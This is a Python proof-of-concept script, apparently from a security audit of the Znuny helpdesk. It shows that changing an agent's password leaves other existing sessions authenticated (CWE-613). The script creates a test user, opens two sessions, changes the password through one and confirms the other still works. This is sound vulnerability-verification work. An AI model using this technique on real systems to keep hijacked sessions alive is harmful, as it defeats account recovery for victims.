#!/usr/bin/env python3
r"""
VULN-014 — Password change/reset does NOT invalidate existing sessions
======================================================================
Vulnerable code : targets/Znuny/Kernel/Output/HTML/Preferences/Password.pm:219-227
                  (SetPassword then `return 1;` — no RemoveSessionByUser); reset flows likewise
Vulnerability   : CWE-613 Insufficient Session Expiration

Changing the password (self-service or reset) does not evict other live sessions, so an attacker
whose session was captured/created survives the victim (or an admin) changing the password —
defeating the primary account-recovery action. Every OTHER preference module (Theme/Language/…)
calls RemoveSessionByUser, proving the omission.

Proof: log in twice (sessions A and B) as the same user; change the password via A; session B
still authenticates afterwards.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def authed(client):
    r = client.get({"Action": "AgentDashboard"})
    return "You are logged in" in r.text

def main():
    C.banner("VULN-014", "Password change does not invalidate existing sessions",
             ["Password.pm:219-227 SetPassword then return 1 — no RemoveSessionByUser (siblings evict)"])
    sfx = C.rid()
    oldpw = f"OldPw_{sfx}"
    u, _ = C.create_agent(login=f"vic014_{sfx}", password=oldpw, groups=["users"])
    C.log("SETUP", f"agent {u}; opening TWO independent sessions (attacker A + victim B)")
    A = C.agent_client(u, oldpw)     # "attacker" session (e.g. previously captured)
    B = C.agent_client(u, oldpw)     # a second live session
    C.log("PROOF", f"before change: session A authenticated={authed(A)}, session B authenticated={authed(B)}")

    newpw = f"NewPw_{sfx}"
    tokA, _ = A.refresh_token(C.AGENT_URL + "?Action=AgentPreferences")
    C.log("STEP", f"session A changes the account password {oldpw} -> {newpw}")
    r = A.post(data={"Action": "AgentPreferences", "Subaction": "Update", "Group": "Password",
                     "CurPw": oldpw, "NewPw": newpw, "NewPw1": newpw, "ChallengeToken": tokA})
    # confirm the password actually changed (login with new pw works)
    changed = False
    try:
        C.agent_client(u, newpw); changed = True
    except Exception:
        pass
    C.log("PROOF", f"password change took effect (login with new pw works): {changed}")

    b_still = authed(B)
    C.log("PROOF", f"AFTER password change: the OTHER session B still authenticates: {b_still}")
    open(os.path.join(HERE, "request.http"), "w").write(
        "POST /znuny/index.pl (session A)  Action=AgentPreferences;Subaction=Update;Group=Password;"
        f"CurPw={oldpw};NewPw={newpw};NewPw1={newpw};ChallengeToken=<A>\n"
        "GET  /znuny/index.pl?Action=AgentDashboard (session B, old cookie) -> still 'You are logged in'\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"password_changed={changed}\nsession_B_still_valid_after_change={b_still}\n")

    if changed and b_still:
        C.confirmed("after the account password was changed, a second pre-existing session remained "
                    "fully authenticated — password change does not evict other sessions "
                    "(CWE-613), so it fails to lock out a compromised session.")
    else:
        C.failed(f"password_changed={changed}, session_B_valid={b_still}")

if __name__ == "__main__":
    main()
